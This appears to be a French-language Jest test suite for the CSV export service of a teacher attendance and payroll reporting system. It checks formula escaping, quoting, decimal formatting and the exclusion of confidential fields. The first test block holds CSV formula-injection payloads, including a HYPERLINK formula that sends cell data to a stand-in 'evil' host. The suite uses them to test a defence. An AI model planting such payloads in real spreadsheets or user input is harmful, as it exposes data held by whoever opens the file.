import { ExportService, cellule } from './export.service';

/** Contenu réel de la cellule, une fois retiré l'éventuel guillemet CSV. */
function contenu(csv: string): string {
  return csv.startsWith('"') && csv.endsWith('"') ? csv.slice(1, -1).replace(/""/g, '"') : csv;
}

describe("cellule d'export CSV", () => {
  it('neutralise une formule injectée en tête de cellule', () => {
    // Un nom d'enseignant ou un intitulé de séance est saisi librement. Une
    // cellule commençant par l'un de ces caractères est lue comme une formule
    // par Excel et LibreOffice, dans le contexte de qui ouvre l'export.
    for (const charge of ['=HYPERLINK("http://evil/?d="&A1,"clic")', '+1+1', '-2+3', '@SUM(A1)']) {
      // Ce qui compte est le premier caractère vu par le tableur, pas la
      // présence d'un guillemet CSV autour.
      expect(contenu(cellule(charge))[0]).toBe("'");
    }
  });

  it('neutralise une tabulation ou un retour en tête', () => {
    expect(contenu(cellule('\t=1+1'))[0]).toBe("'");
    expect(contenu(cellule('\r=1+1'))[0]).toBe("'");
  });

  it('laisse un texte ordinaire intact', () => {
    expect(cellule('Rectorat de Conakry')).toBe('Rectorat de Conakry');
    expect(cellule('Alphonse Diallo')).toBe('Alphonse Diallo');
  });

  it('conserve les guillemets et le séparateur point-virgule', () => {
    expect(cellule('Une;ule')).toBe('"Une;ule"');
    expect(cellule('Il a dit "oui"')).toBe('"Il a dit ""oui"""');
  });

  it('écrit les décimales à la française pour rester numériques', () => {
    expect(cellule(12.5)).toBe('12,5');
  });

  it('traite les valeurs absentes comme vides', () => {
    expect(cellule(null)).toBe('');
    expect(cellule(undefined)).toBe('');
  });
});

describe('projections des exports de rapports', () => {
  const query = { dateDebut: '2026-09-01', dateFin: '2026-09-30' };

  it('exporte les colonnes de présence sans données internes supplémentaires', async () => {
    const rapports = {
      presenceEnseignants: jest.fn().mockResolvedValue({
        lignes: [
          {
            matricule: 'ENS-01',
            nom: '=HYPERLINK("x")',
            grade: 'Maître',
            statutEnseignant: 'ACTIF',
            departement: 'Informatique',
            planifiees: 4,
            controlees: 3,
            assurees: 2,
            retard: 1,
            absent: 0,
            excuse: 0,
            heuresPrevues: 8,
            heuresRealisees: 6,
            tauxPresence: 66.7,
            tauxControle: 75,
            secretInterne: 'masqué',
          },
        ],
      }),
    };
    const service = new ExportService(rapports as never);

    const csv = await service.presenceEnseignants(query);

    expect(rapports.presenceEnseignants).toHaveBeenCalledWith(query);
    expect(csv).toContain('Matricule;Enseignant;Grade;Statut;Département');
    expect(csv).toContain('ENS-01;"\'=HYPERLINK(""x"")";Maître;ACTIF;Informatique');
    expect(csv).not.toContain('masqué');
  });

  it('exporte le volume horaire à partir des lignes de rapport', async () => {
    const rapports = {
      volumeHoraire: jest.fn().mockResolvedValue({
        lignes: [
          {
            enseignant: 'Awa Barry',
            departement: 'Sciences',
            codeMatiere: 'MAT-01',
            matiere: 'Analyse',
            promotion: 'L1',
            volumeHorairePrevu: 20,
            heuresRealisees: 12,
            reste: 8,
            planifiees: 10,
            assurees: 6,
            tauxContrat: 60,
            secretInterne: 'masqué',
          },
        ],
      }),
    };
    const service = new ExportService(rapports as never);

    const csv = await service.volumeHoraire(query);

    expect(rapports.volumeHoraire).toHaveBeenCalledWith(query);
    expect(csv).toContain('Enseignant;Département;Code matière;Matière;Promotion');
    expect(csv).toContain('Awa Barry;Sciences;MAT-01;Analyse;L1;20;12;8;10;6;60');
    expect(csv).not.toContain('masqué');
  });

  it('exporte l’état de paiement et son total calculé', async () => {
    const rapports = {
      etatPaiement: jest.fn().mockResolvedValue({
        lignes: [
          {
            matricule: 'ENS-02',
            nom: 'Mamadou Diallo',
            statutEnseignant: 'VACATAIRE',
            departement: 'Mathématiques',
            seancesAssurees: 3,
            heuresRealisees: 4.5,
            tauxHoraire: 100000,
            montant: 450000,
          },
        ],
        totalHeures: 4.5,
        totalMontant: 450000,
      }),
    };
    const service = new ExportService(rapports as never);

    const csv = await service.etatPaiement(query);

    expect(rapports.etatPaiement).toHaveBeenCalledWith(query);
    expect(csv).toContain('ENS-02;Mamadou Diallo;VACATAIRE;Mathématiques;3;4,5;100000;450000');
    expect(csv).toContain(';TOTAL;;;;4,5;;450000');
  });

  it('n’inclut pas la signature biométrique ni les champs non listés dans le registre CSV', async () => {
    const rapports = {
      registre: jest.fn().mockResolvedValue({
        lignes: [
          {
            date: '2026-09-12',
            horaire: '08:00 - 10:00',
            matricule: 'ENS-03',
            enseignant: 'Fatou Camara',
            matiere: 'Physique',
            promotion: 'L2',
            salle: 'B12',
            type: 'COURS',
            statut: 'PRESENT',
            heureArrivee: '08:02',
            heureFinReelle: '10:00',
            dureeMinutes: 118,
            effectifPresent: 24,
            thematiqueTraitee: 'Optique',
            observation: 'RAS',
            methode: 'QR',
            attestation: 'OUI',
            justificatif: '',
            signatureBase64: 'signature-confidentielle',
          },
        ],
      }),
    };
    const service = new ExportService(rapports as never);

    const csv = await service.registre(query);

    expect(rapports.registre).toHaveBeenCalledWith(query, false, false);
    expect(csv).toContain('Date;Horaire;Matricule;Enseignant;Matière;Promotion;Salle');
    expect(csv).toContain('2026-09-12;08:00 - 10:00;ENS-03;Fatou Camara;Physique;L2;B12');
    expect(csv).not.toContain('signature-confidentielle');
  });
});
